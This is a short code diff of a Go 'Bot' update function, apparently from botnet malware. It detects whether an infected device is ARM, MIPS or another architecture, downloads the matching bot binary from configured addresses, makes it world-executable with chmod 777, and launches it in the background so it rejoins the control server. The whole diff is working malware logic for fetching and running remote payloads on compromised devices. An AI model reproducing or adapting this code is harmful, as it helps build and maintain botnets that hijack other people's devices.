@@ -2,21 +2,22 @@ package lib
 
 import "time"
 
-func (b *Bot) Update() {
+func (b *Bot) update() {
 	if setCall, setKey := SetupCaller(); setKey {
-		defer Kill()
+		defer KILL()
 		b.Report("START UPDATING...")
-
 		/*
-			Match the bot architecture.
+			Match The bot architecture.
 		*/
-		if Find(execComd("tail", "-1", "/var/tmp/"+fileName(true)), "[mips]") {
-			pullWeb(fileName(false), setCall.CallBot.MipsArch)
-		} else {
-			pullWeb(fileName(false), setCall.CallBot.DefaultArch)
+		switch {
+		case Find(execComd("tail", "-1", "/var/tmp/"+fileName(true)), "[arm]"):
+			download(fileName(false), setCall.CallBot.ARM_ARCH)
+		case Find(execComd("tail", "-1", "/var/tmp/"+fileName(true)), "[mips]"):
+			download(fileName(false), setCall.CallBot.MIPS_ARCH)
+		default:
+			download(fileName(false), setCall.CallBot.DEFAULT_ARCH)
 		}
-
-		execComd("chmod", "700", fileName(false))
+		execComd("chmod", "777", fileName(false))
 		go execComd("./"+fileName(false), "&")
 		time.Sleep(10 * time.Second) //Wait for the bot to join the server.
 	}
